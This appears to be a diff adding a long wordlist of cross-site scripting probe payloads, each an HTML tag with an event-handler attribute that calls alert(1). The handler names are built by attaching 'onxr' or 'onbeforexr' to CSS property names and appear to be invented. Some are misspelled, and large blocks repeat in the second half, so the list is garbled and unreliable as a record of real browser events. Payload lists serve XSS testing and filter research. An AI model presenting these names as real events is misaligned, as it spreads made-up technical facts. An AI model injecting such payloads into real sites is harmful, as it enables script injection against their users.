+<x onxrbackgroundcolorchange="alert(1)">
+<x onbeforexrbackgroundcolorschange="alert(1)">
+<x onxrbackgroundcolorschange="alert(1)">
+<x onbeforexrbackgroundimagechange="alert(1)">
+<x onxrbackgroundimagechange="alert(1)">
+<x onbeforexrbackgroundimageschange="alert(1)">
+<x onxrbackgroundimageschange="alert(1)">
+<x onbeforexrbackgroundpositionchange="alert(1)">
+<x onxrbackgroundpositionchange="alert(1)">
+<x onbeforexrbackgroundpositionschange="alert(1)">
+<x onxrbackgroundpositionschange="alert(1)">
+<x onbeforexrbackgroundsizechange="alert(1)">
+<x onxrbackgroundsizechange="alert(1)">
+<x onbeforexrbackgroundsizeschange="alert(1)">
+<x onxrbackgroundsizeschange="alert(1)">
+<x onbeforexrbackgroundrepeatchange="alert(1)">
+<x onxrbackgroundrepeatchange="alert(1)">
+<x onbeforexrbackgroundrepeatschange="alert(1)">
+<x onxrbackgroundrepeatschange="alert(1)">
+<x onbeforexrbackgroundattachmentchange="alert(1)">
+<x onxrbackgroundattachmentchange="alert(1)">
+<x onbeforexrbackgroundattachmentschange="alert(1)">
+<x onxrbackgroundattachmentschange="alert(1)">
+<x onbeforexrbackgroundoriginchange="alert(1)">
+<x onxrbackgroundoriginchange="alert(1)">
+<x onbeforexrbackgroundoriginschange="alert(1)">
+<x onxrbackgroundoriginschange="alert(1)">
+<x onbeforexrbackgroundclipchange="alert(1)">
+<x onxrbackgroundclipchange="alert(1)">
+<x onbeforexrbackgroundclipschange="alert(1)">
+<x onxrbackgroundclipschange="alert(1)">
+<x onbeforexrbackgroundblendmodechange="alert(1)">
+<x onxrbackgroundblendmodechange="alert(1)">
+<x onbeforexrbackgroundblendmodeschange="alert(1)">
+<x onxrbackgroundblendmodeschange="alert(1)">
+<x onbeforexrborderradiuschange="alert(1)">
+<x onxrborderradiuschange="alert(1)">
+<x onbeforexrborderradiusschange="alert(1)">
+<x onxrborderradiusschange="alert(1)">
+<x onbeforexrborderstylechange="alert(1)">
+<x onxrborderstylechange="alert(1)">
+<x onbeforexrborderstyleschange="alert(1)">
+<x onxrborderstyleschange="alert(1)">
+<x onbeforexrborderwidthchange="alert(1)">
+<x onxrborderwidthchange="alert(1)">
+<x onbeforexrborderwidthschange="alert(1)">
+<x onxrborderwidthschange="alert(1)">
+<x onbeforexrbordercolorchange="alert(1)">
+<x onxrbordercolorchange="alert(1)">
+<x onbeforexrbordercolorschange="alert(1)">
+<x onxrbordercolorschange="alert(1)">
+<x onbeforexrboxshadowchange="alert(1)">
+<x onxrboxshadowchange="alert(1)">
+<x onbeforexrboxshadowschange="alert(1)">
+<x onxrboxshadowschange="alert(1)">
+<x onbeforexrtextshadowchange="alert(1)">
+<x onxrtextshadowchange="alert(1)">
+<x onbeforexrtextshadowschange="alert(1)">
+<x onxrtextshadowschange="alert(1)">
+<x onbeforexropacitychange="alert(1)">
+<x onxropacitychange="alert(1)">
+<x onbeforexropacityschange="alert(1)">
+<x onxropacityschange="alert(1)">
+<x onbeforexrtransformchange="alert(1)">
+<x onxrtransformchange="alert(1)">
+<x onbeforexrtransformschange="alert(1)">
+<x onxrtransformschange="alert(1)">
+<x onbeforexrtransitionchange="alert(1)">
+<x onxrtransitionchange="alert(1)">
+<x onbeforexrtransitionschange="alert(1)">
+<x onxrtransitionschange="alert(1)">
+<x onbeforexranimationchange="alert(1)">
+<x onxranimationchange="alert(1)">
+<x onbeforexranimationschange="alert(1)">
+<x onxranimationschange="alert(1)">
+<x onbeforexrfilterchange="alert(1)">
+<x onxrfilterchange="alert(1)">
+<x onbeforexrfilterschange="alert(1)">
+<x onxrfilterschange="alert(1)">
+<x onbeforexrbackdropfilterchange="alert(1)">
+<x onxrbackdropfilterchange="alert(1)">
+<x onbeforexrbackdropfilterschange="alert(1)">
+<x onxrbackdropfilterschange="alert(1)">
+<x onbeforexrmixblendmodechange="alert(1)">
+<x onxrmixblendmodechange="alert(1)">
+<x onbeforexrmixblendmodeschange="alert(1)">
+<x onxrmixblendmodeschange="alert(1)">
+<x onbeforexrisolationchange="alert(1)">
+<x onxrisolationchange="alert(1)">
+<x onbeforexrisolationschange="alert(1)">
+<x onxrisolationschange="alert(1)">
+<x onbeforexrwillchangechange="alert(1)">
+<x onxrwillchangechange="alert(1)">
+<x onbeforexrwillchangeschange="alert(1)">
+<x onxrwillchangeschange="alert(1)">
+<x onbeforexrcontainchange="alert(1)">
+<x onxrcontainchange="alert(1)">
+<x onbeforexrcontainschange="alert(1)">
+<x onxrcontainschange="alert(1)">
+<x onbeforexrcontentvisibilitychange="alert(1)">
+<x onxrcontentvisibilitychange="alert(1)">
+<x onbeforexrcontentvisibilityschange="alert(1)">
+<x onxrcontentvisibilityschange="alert(1)">
+<x onbeforexrcontainintrinsicsizechange="alert(1)">
+<x onxrcontainintrinsicsizechange="alert(1)">
+<x onbeforexrcontainintrinsicsizeschange="alert(1)">
+<x onxrcontainintrinsicsizeschange="alert(1)">
+<x onbeforexrscrolbehaviorchange="alert(1)">
+<x onxrscrolbehaviorchange="alert(1)">
+<x onbeforexrscrolbehaviorschange="alert(1)">
+<x onxrscrolbehaviorschange="alert(1)">
+<x onbeforexrscrollsnapchange="alert(1)">
+<x onxrscrollsnapchange="alert(1)">
+<x onbeforexrscrollsnapschange="alert(1)">
+<x onxrscrollsnapschange="alert(1)">
+<x onbeforexrscrollpaddingchange="alert(1)">
+<x onxrscrollpaddingchange="alert(1)">
+<x onbeforexrscrollpaddingschange="alert(1)">
+<x onxrscrollpaddingschange="alert(1)">
+<x onbeforexrscrollmarginchange="alert(1)">
+<x onxrscrollmarginchange="alert(1)">
+<x onbeforexrscrollmarginschange="alert(1)">
+<x onxrscrollmarginschange="alert(1)">
+<x onbeforexrscrollalignchange="alert(1)">
+<x onxrscrollalignchange="alert(1)">
+<x onbeforexrscrollalignschange="alert(1)">
+<x onxrscrollalignschange="alert(1)">
+<x onbeforexroverflowanchorchange="alert(1)">
+<x onxroverflowanchorchange="alert(1)">
+<x onbeforexroverflowanchorschange="alert(1)">
+<x onxroverflowanchorschange="alert(1)">
+<x onbeforexrtextoverflowchange="alert(1)">
+<x onxrtextoverflowchange="alert(1)">
+<x onbeforexrtextoverflowschange="alert(1)">
+<x onxrtextoverflowschange="alert(1)">
+<x onbeforexrtextwrapchange="alert(1)">
+<x onxrtextwrapchange="alert(1)">
+<x onbeforexrtextwrapschange="alert(1)">
+<x onxrtextwrapschange="alert(1)">
+<x onbeforexrhyphenschange="alert(1)">
+<x onxrhyphenschange="alert(1)">
+<x onbeforexrhyphenschange="alert(1)">
+<x onxrhyphenschange="alert(1)">
+<x onbeforexrresizechange="alert(1)">
+<x onxrresizechange="alert(1)">
+<x onbeforexrresizeschange="alert(1)">
+<x onxrresizeschange="alert(1)">
+<x onbeforexruserselectchange="alert(1)">
+<x onxruserselectchange="alert(1)">
+<x onbeforexruserselectschange="alert(1)">
+<x onxruserselectschange="alert(1)">
+<x onbeforexrcaretcolorchange="alert(1)">
+<x onxrcaretcolorchange="alert(1)">
+<x onbeforexrcaretcolorschange="alert(1)">
+<x onxrcaretcolorschange="alert(1)">
+<x onbeforexrwritingmodechange="alert(1)">
+<x onxrwritingmodechange="alert(1)">
+<x onbeforexrwritingmodeschange="alert(1)">
+<x onxrwritingmodeschange="alert(1)">
+<x onbeforexrdirectionchange="alert(1)">
+<x onxrdirectionchange="alert(1)">
+<x onbeforexrdirectionschange="alert(1)">
+<x onxrdirectionschange="alert(1)">
+<x onbeforexrtextorientationchange="alert(1)">
+<x onxrtextorientationchange="alert(1)">
+<x onbeforexrtextorientationschange="alert(1)">
+<x onxrtextorientationschange="alert(1)">
+<x onbeforexrunicodebidiiechange="alert(1)">
+<x onxrunicodebidiiechange="alert(1)">
+<x onbeforexrunicodebidiieschange="alert(1)">
+<x onxrunicodebidiieschange="alert(1)">
+<x onbeforexrtextcombineuprightchange="alert(1)">
+<x onxrtextcombineuprightchange="alert(1)">
+<x onbeforexrtextcombineuprightschange="alert(1)">
+<x onxrtextcombineuprightschange="alert(1)">
+<x onbeforexrvisibilitychange="alert(1)">
+<x onxrvisibilitychange="alert(1)">
+<x onbeforexrvisibilitieschange="alert(1)">
+<x onxrvisibilitieschange="alert(1)">
+<x onbeforexrdisplaychange="alert(1)">
+<x onxrdisplaychange="alert(1)">
+<x onbeforexrdisplayschange="alert(1)">
+<x onxrdisplayschange="alert(1)">
+<x onbeforexrflexdirectionchange="alert(1)">
+<x onxrflexdirectionchange="alert(1)">
+<x onbeforexrflexdirectionschange="alert(1)">
+<x onxrflexdirectionschange="alert(1)">
+<x onbeforexrflexwrapchange="alert(1)">
+<x onxrflexwrapchange="alert(1)">
+<x onbeforexrflexwrapschange="alert(1)">
+<x onxrflexwrapschange="alert(1)">
+<x onbeforexrflexflowchange="alert(1)">
+<x onxrflexflowchange="alert(1)">
+<x onbeforexrflexflowschange="alert(1)">
+<x onxrflexflowschange="alert(1)">
+<x onbeforexrjustifycontentchange="alert(1)">
+<x onxrjustifycontentchange="alert(1)">
+<x onbeforexrjustifycontentschange="alert(1)">
+<x onxrjustifycontentschange="alert(1)">
+<x onbeforexralignitemschange="alert(1)">
+<x onxralignitemschange="alert(1)">
+<x onbeforexralignitemsschange="alert(1)">
+<x onxralignitemsschange="alert(1)">
+<x onbeforexraligncontentchange="alert(1)">
+<x onxraligncontentchange="alert(1)">
+<x onbeforexraligncontentschange="alert(1)">
+<x onxraligncontentschange="alert(1)">
+<x onbeforexralignselfchange="alert(1)">
+<x onxralignselfchange="alert(1)">
+<x onbeforexralignselfschange="alert(1)">
+<x onxralignselfschange="alert(1)">
+<x onbeforexrorderchange="alert(1)">
+<x onxrorderchange="alert(1)">
+<x onbeforexrorderschange="alert(1)">
+<x onxrorderschange="alert(1)">
+<x onbeforexrflexgrowchange="alert(1)">
+<x onxrflexgrowchange="alert(1)">
+<x onbeforexrflexgrowschange="alert(1)">
+<x onxrflexgrowschange="alert(1)">
+<x onbeforexrflexshrinkchange="alert(1)">
+<x onxrflexshrinkchange="alert(1)">
+<x onbeforexrflexshrinkschange="alert(1)">
+<x onxrflexshrinkschange="alert(1)">
+<x onbeforexrflexbasischange="alert(1)">
+<x onxrflexbasischange="alert(1)">
+<x onbeforexrflexbasisschange="alert(1)">
+<x onxrflexbasisschange="alert(1)">
+<x onbeforexrflexchange="alert(1)">
+<x onxrflexchange="alert(1)">
+<x onbeforexrflexschange="alert(1)">
+<x onxrflexschange="alert(1)">
+<x onbeforexrgapchange="alert(1)">
+<x onxrgapchange="alert(1)">
+<x onbeforexrgapschange="alert(1)">
+<x onxrgapschange="alert(1)">
+<x onbeforexrrowgapchange="alert(1)">
+<x onxrrowgapchange="alert(1)">
+<x onbeforexrrowgapschange="alert(1)">
+<x onxrrowgapschange="alert(1)">
+<x onbeforexrcolumngapchange="alert(1)">
+<x onxrcolumngapchange="alert(1)">
+<x onbeforexrcolumngapschange="alert(1)">
+<x onxrcolumngapschange="alert(1)">
+<x onbeforexrgridtemplatecolumnschange="alert(1)">
+<x onxrgridtemplatecolumnschange="alert(1)">
+<x onbeforexrgridtemplatecolumnsschange="alert(1)">
+<x onxrgridtemplatecolumnsschange="alert(1)">
+<x onbeforexrgridtemplaterowschange="alert(1)">
+<x onxrgridtemplaterowschange="alert(1)">
+<x onbeforexrgridtemplaterowsschange="alert(1)">
+<x onxrgridtemplaterowsschange="alert(1)">
+<x onbeforexrgridtemplateareaschange="alert(1)">
+<x onxrgridtemplateareaschange="alert(1)">
+<x onbeforexrgridtemplateareasschange="alert(1)">
+<x onxrgridtemplateareasschange="alert(1)">
+<x onbeforexrgridtemplatechange="alert(1)">
+<x onxrgridtemplatechange="alert(1)">
+<x onbeforexrgridtemplateschange="alert(1)">
+<x onxrgridtemplateschange="alert(1)">
+<x onbeforexrgridautorowchange="alert(1)">
+<x onxrgridautorowchange="alert(1)">
+<x onbeforexrgridautorowschange="alert(1)">
+<x onxrgridautorowschange="alert(1)">
+<x onbeforexrgridautocolumnchange="alert(1)">
+<x onxrgridautocolumnchange="alert(1)">
+<x onbeforexrgridautocolumnschange="alert(1)">
+<x onxrgridautocolumnschange="alert(1)">
+<x onbeforexrgridautoflowchange="alert(1)">
+<x onxrgridautoflowchange="alert(1)">
+<x onbeforexrgridautoflowschange="alert(1)">
+<x onxrgridautoflowschange="alert(1)">
+<x onbeforexrgridchange="alert(1)">
+<x onxrgridchange="alert(1)">
+<x onbeforexrgridschange="alert(1)">
+<x onxrgridschange="alert(1)">
+<x onbeforexrgridrowstartchange="alert(1)">
+<x onxrgridrowstartchange="alert(1)">
+<x onbeforexrgridrowstartschange="alert(1)">
+<x onxrgridrowstartschange="alert(1)">
+<x onbeforexrgridcolumnstartchange="alert(1)">
+<x onxrgridcolumnstartchange="alert(1)">
+<x onbeforexrgridcolumnstartschange="alert(1)">
+<x onxrgridcolumnstartschange="alert(1)">
+<x onbeforexrgridrowendchange="alert(1)">
+<x onxrgridrowendchange="alert(1)">
+<x onbeforexrgridrowendschange="alert(1)">
+<x onxrgridrowendschange="alert(1)">
+<x onbeforexrgridcolumnendchange="alert(1)">
+<x onxrgridcolumnendchange="alert(1)">
+<x onbeforexrgridcolumnendschange="alert(1)">
+<x onxrgridcolumnendschange="alert(1)">
+<x onbeforexrgridrowchange="alert(1)">
+<x onxrgridrowchange="alert(1)">
+<x onbeforexrgridrowschange="alert(1)">
+<x onxrgridrowschange="alert(1)">
+<x onbeforexrgridcolumnchange="alert(1)">
+<x onxrgridcolumnchange="alert(1)">
+<x onbeforexrgridcolumnschange="alert(1)">
+<x onxrgridcolumnschange="alert(1)">
+<x onbeforexrgridareachange="alert(1)">
+<x onxrgridareachange="alert(1)">
+<x onbeforexrgridareaschange="alert(1)">
+<x onxrgridareaschange="alert(1)">
+<x onbeforexrjustifyselfchange="alert(1)">
+<x onxrjustifyselfchange="alert(1)">
+<x onbeforexrjustifyselfschange="alert(1)">
+<x onxrjustifyselfschange="alert(1)">
+<x onbeforexralignselfchange="alert(1)">
+<x onxralignselfchange="alert(1)">
+<x onbeforexralignselfschange="alert(1)">
+<x onxralignselfschange="alert(1)">
+<x onbeforexrplaceitemschange="alert(1)">
+<x onxrplaceitemschange="alert(1)">
+<x onbeforexrplaceitemsschange="alert(1)">
+<x onxrplaceitemsschange="alert(1)">
+<x onbeforexrplacecontentchange="alert(1)">
+<x onxrplacecontentchange="alert(1)">
+<x onbeforexrplacecontentschange="alert(1)">
+<x onxrplacecontentschange="alert(1)">
+<x onbeforexrplaceselfchange="alert(1)">
+<x onxrplaceselfchange="alert(1)">
+<x onbeforexrplaceselfschange="alert(1)">
+<x onxrplaceselfschange="alert(1)">
+<x onbeforexrplaceitemschange="alert(1)">
+<x onxrplaceitemschange="alert(1)">
+<x onbeforexrplaceitemsschange="alert(1)">
+<x onxrplaceitemsschange="alert(1)">
+<x onbeforexrplacecontentchange="alert(1)">
+<x onxrplacecontentchange="alert(1)">
+<x onbeforexrplacecontentschange="alert(1)">
+<x onxrplacecontentschange="alert(1)">
+<x onbeforexrplaceselfchange="alert(1)">
+<x onxrplaceselfchange="alert(1)">
+<x onbeforexrplaceselfschange="alert(1)">
+<x onxrplaceselfschange="alert(1)">
+<x onbeforexrdisplaychange="alert(1)">
+<x onxrdisplaychange="alert(1)">
+<x onbeforexrdisplayschange="alert(1)">
+<x onxrdisplayschange="alert(1)">
+<x onbeforexrcontainchange="alert(1)">
+<x onxrcontainchange="alert(1)">
+<x onbeforexrcontainschange="alert(1)">
+<x onxrcontainschange="alert(1)">
+<x onbeforexrcontentvisibilitychange="alert(1)">
+<x onxrcontentvisibilitychange="alert(1)">
+<x onbeforexrcontentvisibilityschange="alert(1)">
+<x onxrcontentvisibilityschange="alert(1)">
+<x onbeforexrcontainintrinsicsizechange="alert(1)">
+<x onxrcontainintrinsicsizechange="alert(1)">
+<x onbeforexrcontainintrinsicsizeschange="alert(1)">
+<x onxrcontainintrinsicsizeschange="alert(1)">
+<x onbeforexrscrolbehaviorchange="alert(1)">
+<x onxrscrolbehaviorchange="alert(1)">
+<x onbeforexrscrolbehaviorschange="alert(1)">
+<x onxrscrolbehaviorschange="alert(1)">
+<x onbeforexrscrollsnapchange="alert(1)">
+<x onxrscrollsnapchange="alert(1)">
+<x onbeforexrscrollsnapschange="alert(1)">
+<x onxrscrollsnapschange="alert(1)">
+<x onbeforexrscrollpaddingchange="alert(1)">
+<x onxrscrollpaddingchange="alert(1)">
+<x onbeforexrscrollpaddingschange="alert(1)">
+<x onxrscrollpaddingschange="alert(1)">
+<x onbeforexrscrollmarginchange="alert(1)">
+<x onxrscrollmarginchange="alert(1)">
+<x onbeforexrscrollmarginschange="alert(1)">
+<x onxrscrollmarginschange="alert(1)">
+<x onbeforexrscrollalignchange="alert(1)">
+<x onxrscrollalignchange="alert(1)">
+<x onbeforexrscrollalignschange="alert(1)">
+<x onxrscrollalignschange="alert(1)">
+<x onbeforexroverflowanchorchange="alert(1)">
+<x onxroverflowanchorchange="alert(1)">
+<x onbeforexroverflowanchorschange="alert(1)">
+<x onxroverflowanchorschange="alert(1)">
+<x onbeforexrtextoverflowchange="alert(1)">
+<x onxrtextoverflowchange="alert(1)">
+<x onbeforexrtextoverflowschange="alert(1)">
+<x onxrtextoverflowschange="alert(1)">
+<x onbeforexrtextwrapchange="alert(1)">
+<x onxrtextwrapchange="alert(1)">
+<x onbeforexrtextwrapschange="alert(1)">
+<x onxrtextwrapschange="alert(1)">
+<x onbeforexrhyphenschange="alert(1)">
+<x onxrhyphenschange="alert(1)">
+<x onbeforexrhyphenschange="alert(1)">
+<x onxrhyphenschange="alert(1)">
+<x onbeforexrresizechange="alert(1)">
+<x onxrresizechange="alert(1)">
+<x onbeforexrresizeschange="alert(1)">
+<x onxrresizeschange="alert(1)">
+<x onbeforexruserselectchange="alert(1)">
+<x onxruserselectchange="alert(1)">
+<x onbeforexruserselectschange="alert(1)">
+<x onxruserselectschange="alert(1)">
+<x onbeforexrcaretcolorchange="alert(1)">
+<x onxrcaretcolorchange="alert(1)">
+<x onbeforexrcaretcolorschange="alert(1)">
+<x onxrcaretcolorschange="alert(1)">
+<x onbeforexrwritingmodechange="alert(1)">
+<x onxrwritingmodechange="alert(1)">
+<x onbeforexrwritingmodeschange="alert(1)">
+<x onxrwritingmodeschange="alert(1)">
+<x onbeforexrdirectionchange="alert(1)">
+<x onxrdirectionchange="alert(1)">
+<x onbeforexrdirectionschange="alert(1)">
+<x onxrdirectionschange="alert(1)">
+<x onbeforexrtextorientationchange="alert(1)">
+<x onxrtextorientationchange="alert(1)">
+<x onbeforexrtextorientationschange="alert(1)">
+<x onxrtextorientationschange="alert(1)">
+<x onbeforexrunicodebidiiechange="alert(1)">
+<x onxrunicodebidiiechange="alert(1)">
+<x onbeforexrunicodebidiieschange="alert(1)">
+<x onxrunicodebidiieschange="alert(1)">
+<x onbeforexrtextcombineuprightchange="alert(1)">
+<x onxrtextcombineuprightchange="alert(1)">
+<x onbeforexrtextcombineuprightschange="alert(1)">
+<x onxrtextcombineuprightschange="alert(1)">
